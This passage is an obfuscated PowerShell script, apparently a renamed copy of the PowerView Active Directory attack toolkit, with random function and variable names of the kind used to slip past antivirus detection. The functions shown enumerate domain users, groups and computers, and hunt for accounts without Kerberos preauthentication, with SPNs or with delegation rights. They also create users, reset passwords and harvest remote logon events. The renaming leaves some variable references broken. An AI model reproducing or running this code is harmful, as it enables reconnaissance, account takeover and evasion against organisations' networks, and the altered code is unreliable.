        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $lPmjixzj99 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')
        $DoXqZJkD99 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')
        $eULGCmEi99 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['LDAPFilter']) { $zLdPCUTB99['LDAPFilter'] = $gzpPmKdI99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $EXgNWbdg99 = Herodotus -jeGdZvYa99 $jeGdZvYa99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $EXgNWbdg99 = Herodotus -jeGdZvYa99 $jeGdZvYa99 -DOZPHpup99 $DOZPHpup99 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[liberty] Enumerated forest '$EXgNWbdg99' for target domain '$jeGdZvYa99'"
        }
        $zBWFugXs99 = @{}
        if ($PSBoundParameters['Credential']) { $zBWFugXs99['Credential'] = $DOZPHpup99 }
        if ($EXgNWbdg99) {
            $zBWFugXs99['Forest'] = $EXgNWbdg99
        }
    }
    PROCESS {
        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[liberty] Using specified -dtdvfmir99"
            $BmmDjrng99 = $dtdvfmir99
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[liberty] Extracting property names from -NEqwJTYT99 to use as the reference property set"
            $BmmDjrng99 = Get-Member -kZBXgWDy99 $NEqwJTYT99 -MemberType NoteProperty | Select-Object -Expand Name
            $AeEGWLXL99 = $NEqwJTYT99.objectclass | Select-Object -Last 1
            Write-Verbose "[liberty] Calculated ReferenceObjectClass : $AeEGWLXL99"
        }
        else {
            Write-Verbose "[liberty] Using the default reference property set for the object class '$llbVkLec99'"
        }
        if (($llbVkLec99 -eq 'User') -or ($AeEGWLXL99 -eq 'User')) {
            $jllRahCy99 = togae @SearcherArguments
            if (-not $BmmDjrng99) {
                $BmmDjrng99 = $lPmjixzj99
            }
        }
        elseif (($llbVkLec99 -eq 'Group') -or ($AeEGWLXL99 -eq 'Group')) {
            $jllRahCy99 = deform @SearcherArguments
            if (-not $BmmDjrng99) {
                $BmmDjrng99 = $DoXqZJkD99
            }
        }
        elseif (($llbVkLec99 -eq 'Computer') -or ($AeEGWLXL99 -eq 'Computer')) {
            $jllRahCy99 = boozed @SearcherArguments
            if (-not $BmmDjrng99) {
                $BmmDjrng99 = $eULGCmEi99
            }
        }
        else {
            throw "[liberty] Invalid class: $llbVkLec99"
        }
        ForEach ($Object in $jllRahCy99) {
            $eniwQEmC99 = Get-Member -kZBXgWDy99 $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($kwHDIAdJ99 in $eniwQEmC99) {
                if ($BmmDjrng99 -NotContains $kwHDIAdJ99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $kwHDIAdJ99
                    $Out | Add-Member Noteproperty 'Value' $Object.$kwHDIAdJ99
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}
function togae {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $fqOhNdkk99,
        [Switch]
        $SPN,
        [Switch]
        $LpLeJujw99,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $gMZFyxGX99,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $YtsClhRa99,
        [Switch]
        $ikRWRhPM99,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $ITXHALXD99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $NcvNWdqy99 = [Enum]::GetNames($tGlaulwz99)
        $NcvNWdqy99 = $NcvNWdqy99 | ForEach-Object {$_; "NOT_$_"}
        rapscallions -Name UACFilter -zFsLSBhf99 $NcvNWdqy99 -Type ([array])
    }
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['SecurityMasks']) { $zLdPCUTB99['SecurityMasks'] = $ZvvIEIXc99 }
        if ($PSBoundParameters['Tombstone']) { $zLdPCUTB99['Tombstone'] = $CnaAXLuN99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $KeubriUN99 = breading @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            rapscallions -eDOaPEtH99 -MIeirkyG99 $PSBoundParameters
        }
        if ($KeubriUN99) {
            $waAVGUFD99 = ''
            $nQZyhrEp99 = ''
            $fqOhNdkk99 | Where-Object {$_} | ForEach-Object {
                $MFlrbkhb99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($MFlrbkhb99 -match '^S-1-') {
                    $waAVGUFD99 += "(objectsid=$MFlrbkhb99)"
                }
                elseif ($MFlrbkhb99 -match '^CN=') {
                    $waAVGUFD99 += "(distinguishedname=$MFlrbkhb99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $cIRoWbek99 = $MFlrbkhb99.SubString($MFlrbkhb99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[togae] Extracted domain '$cIRoWbek99' from '$MFlrbkhb99'"
                        $zLdPCUTB99['Domain'] = $cIRoWbek99
                        $KeubriUN99 = breading @SearcherArguments
                        if (-not $KeubriUN99) {
                            Write-Warning "[togae] Unable to retrieve domain searcher for '$cIRoWbek99'"
                        }
                    }
                }
                elseif ($MFlrbkhb99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $yhPDRNjn99 = (([Guid]$MFlrbkhb99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $waAVGUFD99 += "(objectguid=$yhPDRNjn99)"
                }
                elseif ($MFlrbkhb99.Contains('\')) {
                    $IPeanipX99 = $MFlrbkhb99.Replace('\28', '(').Replace('\29', ')') | intrenches -vxxrLejt99 Canonical
                    if ($IPeanipX99) {
                        $BUwbCXsa99 = $IPeanipX99.SubString(0, $IPeanipX99.IndexOf('/'))
                        $rYdFULpQ99 = $MFlrbkhb99.Split('\')[1]
                        $waAVGUFD99 += "(samAccountName=$rYdFULpQ99)"
                        $zLdPCUTB99['Domain'] = $BUwbCXsa99
                        Write-Verbose "[togae] Extracted domain '$BUwbCXsa99' from '$MFlrbkhb99'"
                        $KeubriUN99 = breading @SearcherArguments
                    }
                }
                else {
                    $waAVGUFD99 += "(samAccountName=$MFlrbkhb99)"
                }
            }
            if ($waAVGUFD99 -and ($waAVGUFD99.Trim() -ne '') ) {
                $nQZyhrEp99 += "(|$waAVGUFD99)"
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[togae] Searching for non-null service principal names'
                $nQZyhrEp99 += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[togae] Searching for users who can be delegated'
                $nQZyhrEp99 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                Write-Verbose '[togae] Searching for users who are sensitive and not trusted for delegation'
                $nQZyhrEp99 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose '[togae] Searching for adminCount=1'
                $nQZyhrEp99 += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[togae] Searching for users that are trusted to authenticate for other principals'
                $nQZyhrEp99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                Write-Verbose '[togae] Searching for user accounts that do not require kerberos preauthenticate'
                $nQZyhrEp99 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[togae] Using additional LDAP filter: $gzpPmKdI99"
                $nQZyhrEp99 += "$gzpPmKdI99"
            }
            $UkudTRIT99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $YNcsOqMv99 = $_.Substring(4)
                    $VPkznDAA99 = [Int]($tGlaulwz99::$YNcsOqMv99)
                    $nQZyhrEp99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$VPkznDAA99))"
                }
                else {
                    $VPkznDAA99 = [Int]($tGlaulwz99::$_)
                    $nQZyhrEp99 += "(userAccountControl:1.2.840.113556.1.4.803:=$VPkznDAA99)"
                }
            }
            $KeubriUN99.filter = "(&(samAccountType=805306368)$nQZyhrEp99)"
            Write-Verbose "[togae] filter string: $($KeubriUN99.filter)"
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $KeubriUN99.FindOne() }
            else { $NtqBcYnO99 = $KeubriUN99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $User = $_
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $User = decaffeinating -PvRupVWt99 $_.Properties
                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $User
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[togae] Error disposing of the Results object: $_"
                }
            }
            $KeubriUN99.dispose()
        }
    }
}
function Gautama {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $OaqRhTVK99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $Ajypccoi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $IGRKXOgn99,
        [ValidateNotNullOrEmpty()]
        [String]
        $YuDsZOyX99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    $otRfppJF99 = @{
        'Identity' = $OaqRhTVK99
    }
    if ($PSBoundParameters['Domain']) { $otRfppJF99['Domain'] = $jeGdZvYa99 }
    if ($PSBoundParameters['Credential']) { $otRfppJF99['Credential'] = $DOZPHpup99 }
    $PtKFiSBc99 = sincerer @ContextArguments
    if ($PtKFiSBc99) {
        $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($PtKFiSBc99.Context)
        $User.SamAccountName = $PtKFiSBc99.Identity
        $KekdLBOf99 = New-Object System.Management.Automation.PSCredential('a', $Ajypccoi99)
        $User.SetPassword($KekdLBOf99.GetNetworkCredential().Password)
        $User.Enabled = $True
        $User.PasswordNotRequired = $False
        if ($PSBoundParameters['Name']) {
            $User.Name = $Name
        }
        else {
            $User.Name = $PtKFiSBc99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $User.DisplayName = $IGRKXOgn99
        }
        else {
            $User.DisplayName = $PtKFiSBc99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $User.Description = $YuDsZOyX99
        }
        Write-Verbose "[Gautama] Attempting to create user '$OaqRhTVK99'"
        try {
            $Null = $User.Save()
            Write-Verbose "[Gautama] User '$OaqRhTVK99' successfully created"
            $User
        }
        catch {
            Write-Warning "[Gautama] Error creating user '$OaqRhTVK99' : $_"
        }
    }
}
function windmill {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $fqOhNdkk99,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $Ajypccoi99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    $otRfppJF99 = @{ 'Identity' = $fqOhNdkk99 }
    if ($PSBoundParameters['Domain']) { $otRfppJF99['Domain'] = $jeGdZvYa99 }
    if ($PSBoundParameters['Credential']) { $otRfppJF99['Credential'] = $DOZPHpup99 }
    $PtKFiSBc99 = sincerer @ContextArguments
    if ($PtKFiSBc99) {
        $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($PtKFiSBc99.Context, $fqOhNdkk99)
        if ($User) {
            Write-Verbose "[windmill] Attempting to set the password for user '$fqOhNdkk99'"
            try {
                $KekdLBOf99 = New-Object System.Management.Automation.PSCredential('a', $Ajypccoi99)
                $User.SetPassword($KekdLBOf99.GetNetworkCredential().Password)
                $Null = $User.Save()
                Write-Verbose "[windmill] Password for user '$fqOhNdkk99' successfully reset"
            }
            catch {
                Write-Warning "[windmill] Error setting password for user '$fqOhNdkk99' : $_"
            }
        }
        else {
            Write-Warning "[windmill] Unable to find user '$fqOhNdkk99'"
        }
    }
}
function trisect {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kyzUdCPm99 = $Env:COMPUTERNAME,
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $GhHvCerq99 = [DateTime]::Now.AddDays(-1),
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $eMsiwZGv99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $tcxZrOfw99 = 5000,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $mmMICMsk99 = @"
<QueryList>
    <Query Id="0" Path="Security">
        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($GhHvCerq99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($eMsiwZGv99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>
        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($GhHvCerq99.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($eMsiwZGv99.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>
        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $hejfCtpT99 = @{
            'FilterXPath' = $mmMICMsk99
            'LogName' = 'Security'
            'MaxEvents' = $tcxZrOfw99
        }
        if ($PSBoundParameters['Credential']) { $hejfCtpT99['Credential'] = $DOZPHpup99 }
    }
    PROCESS {
        ForEach ($GucPfsvo99 in $kyzUdCPm99) {
            $hejfCtpT99['ComputerName'] = $GucPfsvo99
            Get-WinEvent @EventArguments| ForEach-Object {
                $Event = $_
                $PvRupVWt99 = $Event.Properties
                Switch ($Event.Id) {
                    4624 {
                        if(-not $PvRupVWt99[5].Value.EndsWith('$')) {
                            $wzSptcsg99 = New-Object PSObject -Property @{
                                ComputerName              = $GucPfsvo99
                                TimeCreated               = $Event.TimeCreated
                                EventId                   = $Event.Id
                                SubjectUserSid            = $PvRupVWt99[0].Value.ToString()
                                SubjectUserName           = $PvRupVWt99[1].Value
                                SubjectDomainName         = $PvRupVWt99[2].Value
                                SubjectLogonId            = $PvRupVWt99[3].Value
                                TargetUserSid             = $PvRupVWt99[4].Value.ToString()
                                TargetUserName            = $PvRupVWt99[5].Value
                                TargetDomainName          = $PvRupVWt99[6].Value
                                TargetLogonId             = $PvRupVWt99[7].Value
                                LogonType                 = $PvRupVWt99[8].Value
                                LogonProcessName          = $PvRupVWt99[9].Value
                                AuthenticationPackageName = $PvRupVWt99[10].Value
                                WorkstationName           = $PvRupVWt99[11].Value
                                LogonGuid                 = $PvRupVWt99[12].Value
                                TransmittedServices       = $PvRupVWt99[13].Value
                                LmPackageName             = $PvRupVWt99[14].Value
                                KeyLength                 = $PvRupVWt99[15].Value
                                ProcessId                 = $PvRupVWt99[16].Value
                                ProcessName               = $PvRupVWt99[17].Value
                                IpAddress                 = $PvRupVWt99[18].Value
                                IpPort                    = $PvRupVWt99[19].Value
                                ImpersonationLevel        = $PvRupVWt99[20].Value
                                RestrictedAdminMode       = $PvRupVWt99[21].Value
                                TargetOutboundUserName    = $PvRupVWt99[22].Value
                                TargetOutboundDomainName  = $PvRupVWt99[23].Value
                                VirtualAccount            = $PvRupVWt99[24].Value
                                TargetLinkedLogonId       = $PvRupVWt99[25].Value
                                ElevatedToken             = $PvRupVWt99[26].Value
                            }
                            $wzSptcsg99.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $wzSptcsg99
                        }
                    }
                    4648 {
                        if((-not $PvRupVWt99[5].Value.EndsWith('$')) -and ($PvRupVWt99[11].Value -match 'taskhost\.exe')) {
                            $wzSptcsg99 = New-Object PSObject -Property @{
                                ComputerName              = $GucPfsvo99
                                TimeCreated       = $Event.TimeCreated
                                EventId           = $Event.Id
                                SubjectUserSid    = $PvRupVWt99[0].Value.ToString()
                                SubjectUserName   = $PvRupVWt99[1].Value
                                SubjectDomainName = $PvRupVWt99[2].Value
                                SubjectLogonId    = $PvRupVWt99[3].Value
                                LogonGuid         = $PvRupVWt99[4].Value.ToString()
                                TargetUserName    = $PvRupVWt99[5].Value
                                TargetDomainName  = $PvRupVWt99[6].Value
                                TargetLogonGuid   = $PvRupVWt99[7].Value
                                TargetServerName  = $PvRupVWt99[8].Value
                                TargetInfo        = $PvRupVWt99[9].Value
                                ProcessId         = $PvRupVWt99[10].Value
                                ProcessName       = $PvRupVWt99[11].Value
                                IpAddress         = $PvRupVWt99[12].Value
                                IpPort            = $PvRupVWt99[13].Value
                            }
                            $wzSptcsg99.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $wzSptcsg99
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($Event.Id)"
                    }
                }
            }
        }
    }
}
function obsessively {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $ECWzPbzO99 = @{}
    if ($PSBoundParameters['Credential']) { $ECWzPbzO99['Credential'] = $DOZPHpup99 }
    try {
        $UnAuDOPw99 = (syllabified @ForestArguments).schema.name
    }
    catch {
        throw '[obsessively] Error in retrieving forest schema path from syllabified'
    }
    if (-not $UnAuDOPw99) {
        throw '[obsessively] Error in retrieving forest schema path from syllabified'
    }
    $zLdPCUTB99 = @{
        'SearchBase' = $UnAuDOPw99
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
    if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
    if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
    if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
    $aTmpPyqi99 = breading @SearcherArguments
    if ($aTmpPyqi99) {
        try {
            $NtqBcYnO99 = $aTmpPyqi99.FindAll()
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[obsessively] Error disposing of the Results object: $_"
                }
            }
            $aTmpPyqi99.dispose()
        }
        catch {
            Write-Verbose "[obsessively] Error in building GUID map: $_"
        }
    }
    $zLdPCUTB99['SearchBase'] = $UnAuDOPw99.replace('Schema','Extended-Rights')
    $zLdPCUTB99['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $SoLgJqTs99 = breading @SearcherArguments
    if ($SoLgJqTs99) {
        try {
            $NtqBcYnO99 = $SoLgJqTs99.FindAll()
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[obsessively] Error disposing of the Results object: $_"
                }
            }
            $SoLgJqTs99.dispose()
        }
        catch {
            Write-Verbose "[obsessively] Error in building GUID map: $_"
        }
    }
    $GUIDs
}
function boozed {
    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $fqOhNdkk99,
        [Switch]
        $xbKFrKFs99,
        [Switch]
        $ikRWRhPM99,
        [Switch]
        $QEMKnZXl99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $SPN,
        [ValidateNotNullOrEmpty()]
        [String]
        $cHJdXVHn99,
        [ValidateNotNullOrEmpty()]
        [String]
        $kVBIYPdx99,
        [ValidateNotNullOrEmpty()]
        [String]
        $TQljdANP99,
        [Switch]
        $Ping,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $NcvNWdqy99 = [Enum]::GetNames($tGlaulwz99)
        $NcvNWdqy99 = $NcvNWdqy99 | ForEach-Object {$_; "NOT_$_"}
        rapscallions -Name UACFilter -zFsLSBhf99 $NcvNWdqy99 -Type ([array])
    }
    BEGIN {
        $zLdPCUTB99 = @{}
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['SearchBase']) { $zLdPCUTB99['SearchBase'] = $MBPsLBEN99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['SearchScope']) { $zLdPCUTB99['SearchScope'] = $eLpWCwqM99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
